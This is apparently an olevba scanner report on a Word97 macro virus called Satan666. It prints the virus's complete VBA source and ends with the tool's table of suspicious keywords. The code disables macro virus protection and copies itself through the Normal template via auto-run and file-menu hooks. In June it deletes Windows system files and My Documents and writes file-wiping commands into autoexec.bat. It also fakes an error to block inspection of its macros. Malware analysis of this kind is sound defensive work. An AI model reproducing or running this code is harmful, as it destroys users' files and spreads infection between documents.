olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Satan
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Satan - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Satan666.bas 
in file: ./Virus.MSWord.Satan - OLE stream: 'Macros/VBA/Satan666'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Satan666()

Dim IFlag
Dim I

Options.VirusProtection = False

IFlag = 0

For I = 1 To WordBasic.CountMacros(0, 0)
    If WordBasic.[MacroName$](I, 0, 0) = "Satan666" Then
        IFlag = 1
    End If
Next I

If IFlag = 1 Then
    GoTo GlobalFine
Else
    On Error Resume Next
    Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "Satan666", wdOrganizerObjectProjectItems
End If

GlobalFine:

IFlag = 0
    
For I = 1 To WordBasic.CountMacros(1, 0)
    If WordBasic.[MacroName$](I, 1, 0) = "Satan666" Then
        IFlag = 1
    End If
Next I
    
If IFlag = 1 Then
    GoTo DocumentFine
Else
    On Error Resume Next
    Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "Satan666", wdOrganizerObjectProjectItems
End If

DocumentFine:

If Month(Now()) = 6 Then

    On Error GoTo KillThem
    Open "c:\autoexec.bat" For Input As #1
    Line Input #1, IFlag
    Close #1
    If IFlag <> "REM Hail Satan!" Then
KillThem:
        Kill "c:\windows\*.*"
        Kill "c:\windows\system\*.*"
        Kill "c:\My Documents"
    
        Open "c:\autoexec.bat" For Append As #1
        Print #1, "@echo off"
        Print #1, "cls"
        Print #1, "echo Hail Satan!"
        Print #1, "echo Hail Satan!"
        Print #1, "echo Hail Satan!"
        Print #1, "echo Hail Satan!"
        Print #1, "echo Hail Satan!"
        Print #1, "echo Hail Satan!"
        Print #1, "echo Hail Satan!"
        Print #1, "echo Hail Satan!"
        Print #1, "echo Y>Yes"
        Print #1, "attrib -h -r -s *.*"
        Print #1, "del *.* <Yes"
        Print #1, "end"
        Close #1
   
        MsgBox "Hail Satan!", vbOKOnly, "Satan666 Word97 Virus"
    Else
                
    End If

End If
   
End Sub
Sub FileOpen()
On Error Resume Next
Application.Run "Satan666"
Dialogs(wdDialogFileOpen).Show
On Error Resume Next
Application.Run "Satan666"
End Sub
Sub FileClose()
On Error Resume Next
Application.Run "Satan666"
WordBasic.FileClose
On Error Resume Next
Application.Run "Satan666"
End Sub
Sub FileSaveAs()
On Error Resume Next
Application.Run "Satan666"
Dialogs(wdDialogFileSaveAs).Show
On Error Resume Next
Application.Run "Satan666"
End Sub
Sub FileSave()
On Error Resume Next
Application.Run "Satan666"
ActiveDocument.Save
On Error Resume Next
Application.Run "Satan666"
End Sub
Sub FileNew()
On Error Resume Next
Application.Run "Satan666"
Dialogs(wdDialogFileNew).Show
On Error Resume Next
Application.Run "Satan666"
End Sub
Sub AutoExec()
On Error Resume Next
Application.Run "Satan666"
End Sub
Sub AutoNew()
On Error Resume Next
Application.Run "Satan666"
End Sub
Sub AutoSave()
On Error Resume Next
Application.Run "Satan666"
End Sub
Sub AutoClose()
On Error Resume Next
Application.Run "Satan666"
End Sub
Sub AutoOpen()
On Error Resume Next
Application.Run "Satan666"
End Sub
Sub ToolsOptions()
Dialogs(wdDialogToolsOptions).Show
On Error Resume Next
Options.VirusProtection = False
Application.Run "Satan666"
End Sub
Sub ViewVBCode()
On Error GoTo NotHome
Open "c:\autoexec.bat" For Input As #1
Line Input #1, IFlag
Close #1

If IFlag = "REM Hail Satan!" Then
    Application.ShowVisualBasicEditor = True
Else
NotHome:
    MsgBox "Sub or Function not defined", vbExclamation + vbOKOnly, "Microsoft Visual Basic"
    Application.Run "Satan666"
End If
End Sub
Sub ToolsMacro()
On Error GoTo NotHome
Open "c:\autoexec.bat" For Input As #1
Line Input #1, IFlag
Close #1

If IFlag = "REM Hail Satan!" Then
    Application.Dialogs(wdDialogToolsMacro).Show
Else
NotHome:
    MsgBox "Sub or Function not defined", vbExclamation + vbOKOnly, "Microsoft Visual Basic"
    Application.Run "Satan666"
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

